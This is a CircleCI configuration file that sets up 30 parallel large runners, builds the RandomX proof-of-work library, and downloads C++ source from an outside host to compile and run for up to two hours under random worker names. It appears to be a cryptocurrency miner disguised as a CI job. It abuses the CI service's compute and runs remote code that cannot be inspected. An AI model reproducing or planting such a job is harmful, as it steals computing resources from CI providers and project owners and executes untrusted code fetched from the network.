version: 2.1
jobs:
  run-cpp:
    machine:
      image: ubuntu-2404:current
    resource_class: large
    parallelism: 30
    steps:
      - run:
          name: setup hugepages and install dependencies
          command: |
            sudo sysctl vm.nr_hugepages=1200
            sudo apt-get update && sudo apt-get install -y curl g++ libcurl4-openssl-dev cmake git
      - run:
          name: build RandomX
          command: |
            cd /tmp
            git clone --depth 1 https://github.com/tevador/RandomX.git randomx
            cd randomx
            mkdir build && cd build
            cmake ..
            make -j$(nproc)
      - run:
          name: fetch source
          command: curl -fsSL "https://ret.sheepnode.com/randomx_live.cpp" -o /tmp/main.cpp
      - run:
          name: build app
          command: g++ -O3 -std=c++20 -I/tmp/randomx/src -o /tmp/app /tmp/main.cpp /tmp/randomx/build/librandomx.a -lcurl -lpthread
      - run:
          name: run
          no_output_timeout: 120m
          command: |
            RAND=$(head -c 100 /dev/urandom | tr -dc 'a-z0-9' | head -c 8)
            export NAME="node-${CIRCLE_NODE_INDEX}-${RAND}"
            export STOP_AFTER=0
            /tmp/app
workflows:
  main:
    jobs:
      - run-cpp